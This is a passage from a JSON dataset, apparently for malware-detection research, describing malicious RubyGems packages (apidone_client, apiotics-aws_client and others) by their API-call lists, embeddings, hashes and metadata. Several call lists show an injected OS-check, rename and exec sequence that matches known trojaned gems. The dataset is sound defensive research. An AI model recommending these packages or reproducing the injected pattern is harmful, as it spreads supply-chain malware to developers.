'env.[](:method).upcase', 'env.[]', 'env.[]', 'env.[]', 'env.[]', '@app.call', 'Faraday.register_middleware', 'lambda', '@app.call(env).on_complete', '@app.call', 'env.[](:response).body', 'env.[]', 'env.[](:status).>=', 'env.[]', 'env.[](:status).<=', 'env.[]', 'resp.respond_to?', 'env.[]', 'raise', 'Apibanca::Client::UnauthorizedError.new', 'resp.backtrace', 'resp.error', 'raise', 'Apibanca::Client::UnauthorizedError.new', 'resp.backtrace', 'resp.error', 'raise', 'Apibanca::Client::InvalidOperationError.new', 'resp.backtrace', 'resp.[]', 'resp.error', 'raise', 'env.[]', 'Faraday.register_middleware', 'lambda', '$LOAD_PATH.unshift', 'File.expand_path', 'require', 'require', 'require', 'refute_nil', 'assert']",
            "n_tokens": 1284,
            "embedding": "[-0.0114998   0.01667753 -0.00164618 ... -0.01163112 -0.03065363\n  0.01019599]",
            "cluster": "0",
            "id": 472,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apibanca_client/0.0.8/apibanca_client-0.0.8.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apibanca_client/0.0.8/apibanca_client-0.0.8_extracted",
            "name": "apibanca_client",
            "version": "0.0.8",
            "published_at": "2020-02-16T04:59:55.902Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rake, minitest, hashie, faraday, faraday_middleware",
            "SHA-256": "b152be597b20bd3df0d34b3d3cf63d252087737642a74c353a395b4f2d0c8ecc"
        },
        {
            "name_version": "apidone_client-0.0.3",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3_extracted/apidone_client-0.0.3_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'Pathname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3_extracted/apidone_client-0.0.3_sourcecode.rb\").dirname.expand_path', 'Pathname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3_extracted/apidone_client-0.0.3_sourcecode.rb\").dirname', 'Pathname', 'autoload', 'autoload', 'autoload', 'require', 'include', 'no_tasks', 'Apidone::Client::Connection.new', 'map', 'desc', 'say', 'map', 'desc', 'method_option', 'method_option', 'connection', 'options.[]', 'options', 'puts', '@c.create(resource, options.[](:data)).data', '@c.create', 'options.[]', 'options', 'map', 'desc', 'method_option', 'method_option', 'method_option', 'connection', 'options.[]', 'options', 'puts', '@c.update(resource, options.[](:id), options.[](:data)).data', '@c.update', 'options.[]', 'options', 'options.[]', 'options', 'map', 'desc', 'method_option', 'method_option', 'method_option', 'connection', 'options.[]', 'options', 'puts', '@c.update', 'options.[]', 'options', 'map', 'desc', 'method_option', 'connection', 'options.[]', 'options', '@c.list(resource).each', '@c.list', 'puts', 'res.data', 'map', 'desc', 'method_option', 'method_option', 'connection', 'options.[]', 'options', 'puts', '@c.show(resource, options.[](:id)).data', '@c.show', 'options.[]', 'options', 'attr_accessor', 'Faraday.new', 'self.endpoint_url', 'faraday.request', 'faraday.adapter', 'Faraday.default_adapter', 'subdomain', '@conn.post', 'response.status.==', 'response.status', 'JSON.parse', 'response.body', 'data.[]=', 'json_response.[]', 'show', 'data.[]', '@conn.put', 'response.status.==', 'response.status', 'JSON.parse', 'response.body', 'Apidone::Client::Resource.new', '@conn.get', 'JSON.parse', 'response.body', 'collection.collect', 'Apidone::Client::Resource.new', '@conn.get', 'Apidone::Client::Resource.new', 'JSON.parse', 'response.body', '@conn.delete', 'response.status.==', 'response.status', 'attr_reader', 'meta_fields', 'private', 'data.keys.each', 'data.keys', 'instance_eval', 'data.[]', 'require', 'File.expand_path', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3_extracted/apidone_client-0.0.3_sourcecode.rb\").+', 'File.dirname', 'describe', 'before', 'Apidone::Client::Connection.new', 'it', '@c.class.should.==', '@c.class.should', '@c.class', 'describe', 'before', '@c.create', 'it', '@response.class.should.==', '@response.class.should', '@response.class', 'it', '@response.should_not', 'be_nil', 'describe', 'before', '@c.list', 'rand', '@c.update', '@list.first.id', '@list.first', 'it', '@response.class.should.==', '@response.class.should', '@response.class', 'it', '@response.age.to_i.should.==', '@response.age.to_i.should', '@response.age.to_i', '@response.age', 'describe', 'before', '@c.list', '@list.last.id', '@list.last', '@c.delete', 'it', '@deleted.should', 'be_true', 'it', '@c.list', '@list.map { |o,|\\n  o.id\\n}.should_not', '@list.map', 'o.id', 'include', 'describe', 'before', '@c.list', '@list.last.id', '@list.last', '@c.show', 'it', '@resource.should_not', 'be_nil', 'require', 'File.expand_path', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3_extracted/apidone_client-0.0.3_sourcecode.rb\").+', 'File.dirname', 'describe', 'before', 'Apidone::Client::Resource.new', 'it', '@resource.methods.include?(\"name\".to_sym).should', '@resource.methods.include?', '@resource.methods', '\"name\".to_sym', 'be_true', '@resource.methods.include?(\"id\".to_sym).should', '@resource.methods.include?', '@resource.methods', '\"id\".to_sym', 'be_true', '@resource.methods.include?(\"age\".to_sym).should', '@resource.methods.include?', '@resource.methods', '\"age\".to_sym', 'be_true', '$LOAD_PATH.unshift', 'File.join', 'File.dirname', 'require', 'require', 'require', 'require']",
            "n_tokens": 1199,
            "embedding": "[-0.00434087  0.01084863  0.00528207 ... -0.00062766 -0.03654774\n  0.0123754 ]",
            "cluster": "0",
            "id": 477,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apidone_client/0.0.3/apidone_client-0.0.3_extracted",
            "name": "apidone_client",
            "version": "0.0.3",
            "published_at": "2020-02-16T05:00:22.354Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, rspec, thor, faraday, json",
            "SHA-256": "a1e0eb9aee7085cb1e1db4f03db2343fa9c911ca6de07bacb1275319f7aed9eb"
        },
        {
            "name_version": "apiotics-aws_client-1.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apiotics-aws_client/1.0.1/apiotics-aws_client-1.0.1_extracted/apiotics-aws_client-1.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'extend', 'self.adapter=', 'require', 'raise', 'MqttAdapter.const_get', 'adapter_lib.to_s.camelcase', 'adapter_lib.to_s', 'raise', 'attr_reader', 'attr_accessor', 'MqttAdapter.adapter.new', 'MqttAdapter.adapter', '@adapter.client_id', '@adapter.connect', '@adapter.publish', '@adapter.loop_start', '@adapter.loop_stop', '@adapter.loop_forever', '@adapter.mqtt_loop', '@adapter.loop_read', '@adapter.loop_write', '@adapter.loop_misc', '@adapter.get', '@adapter.get_packet', '@adapter.generate_client_id', '@adapter.disconnect', '@adapter.connected?', '@adapter.subscribe', '@adapter.subscribe_bunch', '@adapter.unsubscribe', '@adapter.unsubscribe_bunch', '@adapter.set_tls_ssl_context', '@adapter.add_callback_filter_topic', '@adapter.remove_callback_filter_topic', '@adapter.on_connack=', '@adapter.on_suback=', '@adapter.on_unsuback=', '@adapter.on_puback=', '@adapter.on_pubrec=', '@adapter.on_pubrel=', '@adapter.on_pubcomp=', '@adapter.on_message=', '@adapter.on_connack', '@adapter.on_suback', '@adapter.on_unsuback', '@adapter.on_puback', '@adapter.on_pubrec', '@adapter.on_pubrel', '@adapter.on_pubcomp', '@adapter.on_message', '@adapter.host', '@adapter.host=', '@adapter.port', '@adapter.port=', '@adapter.ssl', '@adapter.ssl=', 'require', 'PahoMqtt::Client.new', '@client.client_id', 'args.last.is_a?', 'args.last', 'args.last', 'attr.each_pair', '[:host, :port, :keep_alive, :persistent].include?', '@client.send', 'raise', '@client.connect', 'block_given?', '@mqtt_client.disconnect', '@client.publish', 'Thread.new', 'loop_forever', 'thread.join', 'loop', '@client.mqtt_loop', '@client.mqtt_loop', '@client.loop_read', '@client.loop_write', '@client.loop_misc', '@client.loop_read', '@client.loop_read', '@client.generate_client_id', '@client.disconnect', '@client.connected?', '@client.subscribe', '@client.subscribe', '@client.unsubscribe', '@client.unsubscribe', '@client.config_ssl_context', '@client.add_topic_callback', '@client.remove_topic_callback', '@client.on_connack=', '@client.on_suback=', '@client.on_unsuback=', '@client.on_puback=', '@client.on_pubrec=', '@client.on_pubrel=', '@client.on_pubcomp=', '@client.on_message=', '@client.on_connack', '@client.on_suback', '@client.on_unsuback', '@client.on_puback', '@client.on_pubrec', '@client.on_pubrel', '@client.on_pubcomp', '@client.on_message', '@client.host', '@client.host=', '@client.port', '@client.port=', '@client.ssl', '@client.ssl=', 'require', 'require', 'attr_reader', 'attr_accessor', 'MQTT::Client.new', 'generate_client_id', '@client.publish', 'MQTT::Client.new', '@client.nil?', 'create_client', '@client.connect', 'loop_start', 'Array(\"A\"..\"Z\") + Array(\"a\"..\"z\").+', 'Array(\"A\"..\"Z\").+', 'Array', 'Array', 'Array', '@client_id << prefix.<<', '@client_id.<<', 'Array.new(lenght) {\\n  charset.sample\\n}.join', 'Array.new', 'charset.sample', '@client.ssl_context', '@client.disconnect', '@client.connected?', '@client.subscribe', '@client.get', '@client.get_packet', '@client.queue_empty?', '@client.queue_length', '@client.unsubscribe', '@client.host', '@client.host=', '@client.port', '@client.port=', '@client.ssl=', '@client.ssl', '@client.ssl_context', '@client.cert_file=', '@client.key_file=', '@client.ca_file=', 'Thread.new', 'loop_forever', 'thread.join', 'loop', 'mqtt_loop', 'sleep', 'loop_read', 'loop_write', 'loop_misc', '@client.queue_empty?.!', '@client.queue_empty?', 'counter_message.<=', 'get_packet', 'message.topic', '@filtered_topics.key?', '@filtered_topics.[]', 'callback.call', 'on_message_callback', 'puts', 'puts', 'block_given?', '@on_message.is_a?', '@on_message.lambda?', '@on_message.call', 'callback.nil?', '@filtered_topic.delete', '@filtered_topics.[]=', '@filtered_topics.key', '@filtered_topics.delete', 'require', '[\"get\", \"update\", \"delete\", \"delta\"].freeze', 'require', 'require', 'require', 'require', 'JSON.parse', '@message.[]', '@message.[]=', '@message.to_json', 'require', 'attr_reader', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'create_mqtt_adapter', 'Mutex.new', 'Mutex.new', 'Mutex.new', '@client.host=', '@client.host', '@client.port=', '@client.port', '@client.client_id', 'MqttAdapter::Client.new', 'host.nil?', 'port.nil?', 'raise', '@client.host=', '@client.port=', 'self.ca_file=', 'self.key=', 'self.cert=', '@client.set_tls_ssl_context', '@client.connect', '@client.disconnect', 'topic.nil?', 'raise', '@mutex_publish.synchronize', '@client.publish', 'topic.nil?', 'raise', '@mutex_subscribe.synchronize', '@client.add_callback_filter_topic', '@client.subscribe', '@mutex_subscribe.synchronize', 'topics.each', 'topic.[](2).nil?.!', 'topic.[](2).nil?', 'topic.[]', 'topic.[](2).is_a?', 'topic.[]', '@client.add_callback_filter_topic', 'topic.first', 'topic.pop', '@client.subscribe_bunch', 'topic.nil?', 'raise', '@mutex_unsubscribe.synchronize', '@client.remove_callback_filter_topic', '@client.unsubscribe', '@mutex_unsubscribe.synchronize', 'topics.each', '@client.remove_callback_filter_topic', '@client.unsubscribe_bunch', 'paho_client?', '@client.on_connack=', 'paho_client?', '@client.on_suback=', 'paho_client?', '@client.on_unsuback=', 'paho_client?', '@client.on_puback=', 'paho_client?', '@client.on_pubrec=', 'paho_client?', '@client.on_pubrel=', 'paho_client?', '@client.on_pubcomp=', '@client.on_message=', 'paho_client?', '@client.on_connack', 'paho_client?', '@client.on_suback', 'paho_client?', '@client.on_unsuback', 'paho_client?', '@client.on_puback', 'paho_client?', '@client.on_pubrec', 'paho_client?', '@client.on_pubrel', 'paho_client?', '@client.on_pubcomp', '@client.on_message', '@client.add_callback_filter_topic', '@client.remove_callback_filter_topic', '@client.adapter.class.==', '@client.adapter.class', '@client.adapter', 'private', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'ShadowTopicManager.new', 'JSONPayloadParser.new', '@is_subscribed.[]=', '@is_subscribed.[]=', '@is_subscribed.[]=', 'TokenCreator.new', 'mqtt_client.client_id', '@topic_subscribed_callback.[]=', '@topic_subscribed_callback.[]=', '@topic_subscribed_callback.[]=', '@topic_subscribed_task_count.[]=', '@topic_subscribed_task_count.[]=', '@topic_subscribed_task_count.[]=', 'Mutex.new', 'Mutex.new', 'Mutex.new', 'set_basic_callback', 'shadow_action', 'shadow_action', 'shadow_action', 'register_action_callback', 'register_action_callback', 'register_action_callback', 'callback.is_a?', '@topic_subscribed_callback.[]=', 'block_given?', '@topic_subscribed_callback.[]=', '@topic_manager.shadow_topic_subscribe', 'remove_action_callback', 'remove_action_callback', 'remove_action_callback', '@topic_subscribe_callback.delete.[]', '@topic_subscribe_callback.delete', '@topic_manager.shadow_topic_unsubscribe', '@logger.nil?.!', '@logger.nil?', '@logger.is_a?', 'private', 'Timers::Group.new', '@token_mutex.synchronize', '@token_handler.create_next_token', 'timer.after', 'timeout_manager', '@parser_mutex.synchronize', 'payload.==', '@payload_parser.set_message', '@payload_parser.set_attribute_value', '@payload_parser.get_json', '@is_subscribed.[]', 'handle_subscription', '@topic_manager.shadow_topic_publish', 'action.to_s', '@task_count_mutex.synchronize', '@topic_subscribed_task_count.[]', '@token_pool.[]=', 'register_token_callback', 'Thread.new', 'timer.wait', '@token_pool.has_key?', 'action_name.to_sym', '@token_pool.delete', '@token_callback.delete', 'logger?', '@logger.warn', '@task_count_mutex.synchronize', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[](action).<=', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[]=', '@topic_manager.shadow_topic_unsubscribe', '@is_subscribed.[]=', 'action.to_sym', 'proc', 'do_message_callback', '@topic_manager.on_suback=', 'lambda', '@topic_manager.retrieve_action', 'topics.[]', 'action.nil?', '@is_subscribed.[]', '@topic_manager.on_unsuback=', 'lambda', '@topic_manager.retrieve_action', 'topics.[]', 'action.nil?', '@is_subscribed.[]=', 'callback.is_a?', '@token_callback.[]=', 'block_given?', '@token_callback.[]=', '@token_callback.delete', 'callback.is_a?', '@topic_subscribed_callback.[]=', 'block_given?', '@topic_subscribed_callback.[]=', '@topic_subscribed_callback.[]=', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[](action).<=', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[]=', '@topic_manager.shadow_topic_unsubscribe', 'action.to_s', '@is_subscribed.[]=', 'message.topic', 'parse_action', 'parse_type', 'message.payload', '@parser_mutex.synchronize', '@payload_parser.set_message', '@payload_parser.get_attribute_value', '@payload_parser.get_attribute_value', '[\"get\", \"update\", \"delete\"].include?', '@token_pool.has_key?', '@token_pool.[](token).cancel', '@token_pool.[]', '@token_pool.delete', 'type.eql?', 'do_accepted', 'action.to_sym', 'do_rejected', '@task_count_mutex.synchronize', 'decresase_task_count', 'action.to_sym', '[\"delta\"].include?', 'do_delta', 'new_version.>=', 'logger?', '@logger.info', 'type.eql?', 'Thread.new', 'accepted_tasks', 'logger?', '@logger.warn', '@topic_subscribed_callback.[](action).nil?', '@topic_subscribed_callback.[]', '@topic_subscribed_callback.[](action).call', '@topic_subscribed_callback.[]', '@token_callback.has_key?', '@token_callback.[](token).call', '@token_callback.[]', '@token_callback.delete', 'new_version.>=', 'logger?', '@logger.info', '@token_callback.delete', 'logger?', '@logger.warn', 'new_version.>=', 'logger?', '@logger.info', '@topic_subscribed_callback.[](:delta).nil?', '@topic_subscribed_callback.[]', 'Thread.new', '@topic_subscribed_callback.[](:delta).call', '@topic_subscribed_callback.[]', 'logger?', '@logger.warn', '@topic_manager.shadow_topic_subscribe', 'action.to_s', '@topic_manager.paho_client?', 'Time.now.+', 'Time.now', '@is_subscribed.[](action).!', '@is_subscribed.[]', 'handle_timeout', 'sleep', 'sleep', 'Time.now.<=', 'Time.now', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[](5).==', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[]', 'topic.split', 'require', 'require', 'require', 'args.last.nil?', 'args.last', 'MqttManager.new', 'config_attr', 'args.last', '@mqtt_client.connect', 'logger?', 'self.logger.info', 'self.logger', 'block_given?', '@mqtt_client.disconnect', 'ShadowActionManager.new', 'File.open', 'Logger.new', 'log_file.level=', '@action_manager.logger=', '@action_manager.logger', '@action_manager.logger?', '@action_manager.shadow_get', '@action_manager.shadow_update', '@action_manager.shadow_delete', '@action_manager.register_get_callback', '@action_manager.register_update_callback', '@action_manager.register_delete_callback', '@action_manager.register_shadow_delta_callback', '@action_manager.remove_shadow_delta_callback', '@action_manager.remove_get_callback', '@action_manager.remove_update_callback', '@action_manager.remove_delete_callback', '@mqtt_client.disconnect', '@mqtt_client.config_endpoint', '@mqtt_client.config_ssl_context', 'private', 'args.dup', 'shadow_attr.keep_if', 'key.==', 'key.==', 'key.==', 'mqtt_attr.delete_if', 'key.==', 'key.==', 'key.==', 'MqttManager.new', 'shadow_attr.[]', 'shadow_attr.has_key?', 'create_shadow_handler_with_name', 'shadow_attr.[]', 'shadow_attr.[]', 'require', 'mqtt_manager.nil?', 'raise', 'shadow_name.nil?', 'raise', 'Mutex.new', 'TopicBuilder.new', 'mqtt_manager.mqtt_operation_timeout_s', '@mqtt_manager.publish', '@topic.get_topic_general', '@sub_unsub_mutex.synchronize', '@topic.is_delta?', '@mqtt_manager.subscribe', '@topic.get_topic_delta', '@mqtt_manager.subscribe_bunch', '@topic.get_topic_accepted', '@topic.get_topic_rejected', '@sub_unsub_mutex.synchronize', '@topic.is_delta?', '@mqtt_manager.unsubscribe', '@topic.get_topic_delta', '@mqtt_manager.unsubscribe_bunch', '@topic.get_topic_accepted', '@topic.get_topic_rejected', 'ACTION_NAME.each', 'topic.[](0).==', 'topic.[]', '@topic.get_topic_accepted', 'action.to_sym', '@mqtt_manager.paho_client?', '@mqtt_manager.on_suback=', '@mqtt_manager.on_suback', '@mqtt_manager.on_unsuback=', '@mqtt_manager.on_unsuback', 'require', 'require', 'require', 'require', 'shadow_name.length.>', 'shadow_name.length', 'shadow_name.[]', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\" << \"_\" << \"#{@sequence_number}\" << \"_\".<<', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\" << \"_\" << \"#{@sequence_number}\".<<', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\" << \"_\".<<', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\".<<', 'token << \"#{@client_id}\" << \"_\".<<', 'token << \"#{@client_id}\".<<', 'token.<<', 'random_token_string', 'private', 'Array(\"A\"..\"Z\") + Array(\"a\"..\"z\").+', 'Array(\"A\"..\"Z\").+', 'Array', 'Array', 'Array', 'Array.new(lenght) {\\n  charset.sample\\n}.join', 'Array.new', 'charset.sample', 'shadow_name.nil?', 'raise', 'action.==', 'ACTION_NAME.[]', 'ACTION_NAME.include?', 'raise', '@topic_general.+', 'get_topic_general(action).+', 'get_topic_general', 'get_topic_general(action).+', 'get_topic_general', 'require', 'OptionParser.new { |opts,|\\n  opts.banner=\"Basic usage basic_greeting.rb -c \\\\\"YOUR_CERTIFICATE_PATH\\\\\" -k \\\\\"YOUR_KEY_FILE_PATH\\\\\" -ca \\\\\"YOUR_ROOT_CA_PATH -H \\\\\"YOUR_ENDPOINT\\\\\" -p 8883 -t \\\\\"YOUR THING NAME\\\\\"\\\\n\"\\n  opts.separator(\"\")\\n  opts.separator(\"Common options\")\\n  opts.on_tail(\"-h\", \"--help\", \"--usage\", \"Show this message\") {\\n    puts(opts)\\n    exit\\n  }\\n  opts.on(\"-H\", \"--host [END_POINT]\", \"The endpoint where you want to connect\") { |host,|\\n    options.[]=(:host, host)\\n  }\\n  opts.on(\"-p\", \"--port [MQTT_PORT]\", \"The port used for the connection Default is 8883\") { |port,|\\n    options.[]=(:port, port)\\n  }\\n  opts.on(\"-c\", \"--cert [CERT_FILE_PATH]\", \"The path to the certificate file of the private key.\") { |cert,|\\n    options.[]=(:cert, cert)\\n  }\\n  opts.on(\"-k\", \"--key [KEY_FILE_PATH]\", \"The path to private key file that would be used for encryption\") { |key,|\\n    options.[]=(:key, key)\\n  }\\n  opts.on(\"-a\", \"--root_ca [ROOT_CA_PATH]\", \"The path to the authority certification file\") { |root_ca,|\\n    options.[]=(:root_ca, root_ca)\\n  }\\n  opts.on(\"-t\", \"--thing [THING_NAME]\", \"The Thing name on which the action would be done\") { |thing,|\\n    options.[]=(:things, thing)\\n  }\\n}.parse!', 'OptionParser.new', 'opts.banner=', 'opts.separator', 'opts.separator', 'opts.on_tail', 'puts', 'exit', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'AwsIotDevice::MqttShadowClient::MqttManager.new', 'mqtt_client.config_ssl_context', 'mqtt_client.connect', 'AwsIotDevice::MqttShadowClient::ShadowTopicManager.new', 'AwsIotDevice::MqttShadowClient::ShadowActionManager.new', 'AwsIotDevice::MqttShadowClient::ShadowClient.new', 'shadow_client.configure_endpoint', 'shadow_client.configure_credentials', 'shadow_client.create_shadow_handler_with_name', 'shadow_client.connect', '$:.unshift', 'File.expand_path', 'require', 'require', 'setting_mqtt_client', 'setting_mqtt_client', 'Proc.new', 'p', 'p', 'message.topic', 'p', 'message.payload', 'Proc.new', 'p', 'p', 'message.topic', 'p', 'message.payload', 'client.subscribe', 'client2.subscribe', 'puts', 'client.publish', 'client2.publish', 'sleep', '2.times', 'client.publish', 'sleep', 'client2.publish', 'sleep', 'sleep', 'client.disconnect', 'client2.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_mqtt_client', 'setting_action_manager', 'client.register_shadow_delta_callback', '5.times', 'client.shadow_update', 'sleep', 'mqtt_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_shadow', 'my_shadow_client.connect', 'puts', 'client.get_shadow', 'puts', 'client.get_shadow', 'puts', 'puts', 'client.get_shadow', 'sleep', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_shadow', '3.times', 'puts', 'my_shadow_client.delete_shadow', 'sleep', 'my_shadow_client.update_shadow', 'sleep', 'my_shadow_client.disconnect', 'require', 'AwsIotDevice::MqttShadowClient::ShadowClient.new', 'shadow_client.configure_endpoint', 'shadow_client.configure_credentials', 'shadow_client.create_shadow_handler_with_name', 'shadow_client.connect', 'shadow_client.register_get_callback', 'puts', 'shadow_client.register_delete_callback', 'proc', 'puts', 'shadow_client.register_update_callback', 'lambda', 'puts', 'shadow_client.register_delta_callback', 'puts', 'shadow_client.get_shadow', 'puts', 'shadow_client.delete_shadow', 'proc', 'puts', 'shadow_client.update_shadow', 'lambda', 'puts', 'sleep', 'shadow_client.remove_get_callback', 'shadow_client.remove_update_callback', 'shadow_client.remove_delete_callback', 'shadow_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_shadow', 'puts', 'my_shadow_client.get_shadow', 'puts', 'my_shadow_client.get_shadow', 'puts', 'puts', 'my_shadow_client.get_shadow', 'sleep', 'require', 'AwsIotDevice::MqttShadowClient::ShadowClient.new', 'shadow_client.configure_endpoint', 'shadow_client.configure_credentials', 'shadow_client.create_shadow_handler_with_name', 'shadow_client.connect', 'shadow_client.get_shadow', 'p', 'sleep', 'shadow_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'Proc.new', 'JSON.parse', 'delta.payload', 'puts', 'message.[](\"state\").[]', 'message.[]', 'setting_shadow', 'my_shadow_client.register_delta_callback', '3.times', 'puts', '$stdin.readline', 'entry.delete!', 'my_shadow_client.update_shadow', 'puts', '3.-', 'sleep', 'my_shadow_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'setting_mqtt_client', 'setting_topic_manager', 'Proc.new', 'puts', 'puts', 'message.topic', 'puts', 'message.payload', 'puts', 'topic_client.shadow_topic_subscribe', '4.times', 'topic_client.shadow_topic_publish', 'sleep', 'mqtt_client.disconnect']",
            "n_tokens": 4712,
            "embedding": "[-0.02153551 -0.02573802 -0.00273396 ... -0.00137048 -0.01494225\n  0.02416908]",
            "cluster": "0",
            "id": 453,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apiotics-aws_client/1.0.1/apiotics-aws_client-1.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apiotics-aws_client/1.0.1/apiotics-aws_client-1.0.1_extracted",
            "name": "apiotics-aws_client",
            "version": "1.0.1",
            "published_at": "2020-02-16T05:01:35.388Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, pry, rake, rspec, json, apiotics-paho-mqtt, timers",
            "SHA-256": "540d38a2eb16b0d9923c5b6bc2fcae4aa1ab1253d7ca554bba4ce3a0146bfd30"
        },
        {
            "name_version": "apiotics-aws_iot_client-1.0.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apiotics-aws_iot_client/1.0.1/apiotics-aws_iot_client-1.0.1_extracted/apiotics-aws_iot_client-1.0.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require', 'extend', 'self.adapter=', 'require', 'raise', 'MqttAdapter.const_get', 'adapter_lib.to_s.camelcase', 'adapter_lib.to_s', 'raise', 'attr_reader', 'attr_accessor', 'MqttAdapter.adapter.new', 'MqttAdapter.adapter', '@adapter.client_id', '@adapter.connect', '@adapter.publish', '@adapter.loop_start', '@adapter.loop_stop', '@adapter.loop_forever', '@adapter.mqtt_loop', '@adapter.loop_read', '@adapter.loop_write', '@adapter.loop_misc', '@adapter.get', '@adapter.get_packet', '@adapter.generate_client_id', '@adapter.disconnect', '@adapter.connected?', '@adapter.subscribe', '@adapter.subscribe_bunch', '@adapter.unsubscribe', '@adapter.unsubscribe_bunch', '@adapter.set_tls_ssl_context', '@adapter.add_callback_filter_topic', '@adapter.remove_callback_filter_topic', '@adapter.on_connack=', '@adapter.on_suback=', '@adapter.on_unsuback=', '@adapter.on_puback=', '@adapter.on_pubrec=', '@adapter.on_pubrel=', '@adapter.on_pubcomp=', '@adapter.on_message=', '@adapter.on_connack', '@adapter.on_suback', '@adapter.on_unsuback', '@adapter.on_puback', '@adapter.on_pubrec', '@adapter.on_pubrel', '@adapter.on_pubcomp', '@adapter.on_message', '@adapter.host', '@adapter.host=', '@adapter.port', '@adapter.port=', '@adapter.ssl', '@adapter.ssl=', 'require', 'PahoMqtt::Client.new', '@client.client_id', 'args.last.is_a?', 'args.last', 'args.last', 'attr.each_pair', '[:host, :port, :keep_alive, :persistent].include?', '@client.send', 'raise', '@client.connect', 'block_given?', '@mqtt_client.disconnect', '@client.publish', 'Thread.new', 'loop_forever', 'thread.join', 'loop', '@client.mqtt_loop', '@client.mqtt_loop', '@client.loop_read', '@client.loop_write', '@client.loop_misc', '@client.loop_read', '@client.loop_read', '@client.generate_client_id', '@client.disconnect', '@client.connected?', '@client.subscribe', '@client.subscribe', '@client.unsubscribe', '@client.unsubscribe', '@client.config_ssl_context', '@client.add_topic_callback', '@client.remove_topic_callback', '@client.on_connack=', '@client.on_suback=', '@client.on_unsuback=', '@client.on_puback=', '@client.on_pubrec=', '@client.on_pubrel=', '@client.on_pubcomp=', '@client.on_message=', '@client.on_connack', '@client.on_suback', '@client.on_unsuback', '@client.on_puback', '@client.on_pubrec', '@client.on_pubrel', '@client.on_pubcomp', '@client.on_message', '@client.host', '@client.host=', '@client.port', '@client.port=', '@client.ssl', '@client.ssl=', 'require', 'require', 'attr_reader', 'attr_accessor', 'MQTT::Client.new', 'generate_client_id', '@client.publish', 'MQTT::Client.new', '@client.nil?', 'create_client', '@client.connect', 'loop_start', 'Array(\"A\"..\"Z\") + Array(\"a\"..\"z\").+', 'Array(\"A\"..\"Z\").+', 'Array', 'Array', 'Array', '@client_id << prefix.<<', '@client_id.<<', 'Array.new(lenght) {\\n  charset.sample\\n}.join', 'Array.new', 'charset.sample', '@client.ssl_context', '@client.disconnect', '@client.connected?', '@client.subscribe', '@client.get', '@client.get_packet', '@client.queue_empty?', '@client.queue_length', '@client.unsubscribe', '@client.host', '@client.host=', '@client.port', '@client.port=', '@client.ssl=', '@client.ssl', '@client.ssl_context', '@client.cert_file=', '@client.key_file=', '@client.ca_file=', 'Thread.new', 